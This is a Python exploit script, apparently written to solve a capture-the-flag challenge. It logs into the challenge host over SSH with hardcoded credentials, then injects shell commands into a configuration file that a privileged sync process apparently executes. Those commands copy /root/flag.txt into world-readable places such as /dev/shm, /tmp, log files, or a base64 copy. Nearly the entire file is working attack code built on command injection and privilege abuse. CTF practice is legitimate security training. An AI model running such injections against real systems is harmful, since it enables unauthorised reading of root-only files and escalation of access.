#!/usr/bin/env python3
import paramiko
import time
import sys

HOST = "instance.ctf.tdho.st"
PORT = 32971
USER = "player"
PASSWORD = "reyalp"

def exec_cmd(ssh, cmd, wait=0):
    """Execute command and return output"""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=15)
    if wait > 0:
        time.sleep(wait)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out + err

try:
    print("[*] Connecting to game server...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD, timeout=10)
    
    print("[*] Connected! Attempting flag extraction...")
    
    # Method 1: /dev/shm (RAM disk, fast)
    print("\n[1] Trying /dev/shm...")
    exec_cmd(ssh, 'echo "talldwarf-sync-command=cat /root/flag.txt > /dev/shm/flag.txt && chmod 777 /dev/shm/flag.txt" > /opt/mc/config/sync-request.conf')
    time.sleep(12)
    flag = exec_cmd(ssh, "cat /dev/shm/flag.txt 2>/dev/null")
    if "tdho{" in flag or "HTB{" in flag or "flag{" in flag:
        print(f"\n[SUCCESS] FLAG: {flag.strip()}")
        sys.exit(0)
    
    # Method 2: /tmp with hidden name
    print("\n[2] Trying /tmp...")
    exec_cmd(ssh, 'echo "talldwarf-sync-command=cat /root/flag.txt > /tmp/.flag && chmod 777 /tmp/.flag" > /opt/mc/config/sync-request.conf')
    time.sleep(12)
    flag = exec_cmd(ssh, "cat /tmp/.flag 2>/dev/null")
    if "tdho{" in flag:
        print(f"\n[SUCCESS] FLAG: {flag.strip()}")
        sys.exit(0)
    
    # Method 3: World-readable in /opt/mc
    print("\n[3] Trying /opt/mc/logs...")
    exec_cmd(ssh, 'echo "talldwarf-sync-command=cat /root/flag.txt > /opt/mc/logs/system.log && chmod 644 /opt/mc/logs/system.log" > /opt/mc/config/sync-request.conf')
    time.sleep(12)
    flag = exec_cmd(ssh, "cat /opt/mc/logs/system.log 2>/dev/null")
    if "tdho{" in flag:
        print(f"\n[SUCCESS] FLAG: {flag.strip()}")
        sys.exit(0)
    
    # Method 4: Append to existing log
    print("\n[4] Trying append to latest.log...")
    exec_cmd(ssh, 'echo "talldwarf-sync-command=cat /root/flag.txt >> /opt/mc/logs/latest.log" > /opt/mc/config/sync-request.conf')
    time.sleep(12)
    flag = exec_cmd(ssh, "tail -5 /opt/mc/logs/latest.log | grep -E 'tdho|flag|HTB'")
    if flag.strip():
        print(f"\n[SUCCESS] FLAG: {flag.strip()}")
        sys.exit(0)
    
    # Method 5: Base64 encode
    print("\n[5] Trying base64 encoding...")
    exec_cmd(ssh, 'echo "talldwarf-sync-command=base64 /root/flag.txt > /tmp/b64.txt && chmod 666 /tmp/b64.txt" > /opt/mc/config/sync-request.conf')
    time.sleep(12)
    b64 = exec_cmd(ssh, "cat /tmp/b64.txt 2>/dev/null | base64 -d")
    if b64.strip():
        print(f"\n[SUCCESS] FLAG: {b64.strip()}")
        sys.exit(0)
    
    # Debug: Check what sync-loop is actually doing
    print("\n[DEBUG] Checking sync-loop process...")
    print(exec_cmd(ssh, "ps aux | grep sync"))
    print(exec_cmd(ssh, "cat /opt/mc/config/sync-request.conf"))
    print(exec_cmd(ssh, "ls -laR /opt/mc/ 2>/dev/null | grep -A2 'flag'"))
    
    print("\n[!] All methods failed. Flag not found.")
    
except Exception as e:
    print(f"[ERROR] {e}")
    print("\n[FALLBACK] Try manual connection:")
    print(f"ssh player@{HOST} -p {PORT}")
    print(f"Password: {PASSWORD}")

finally:
    try:
        ssh.close()
    except:
        pass
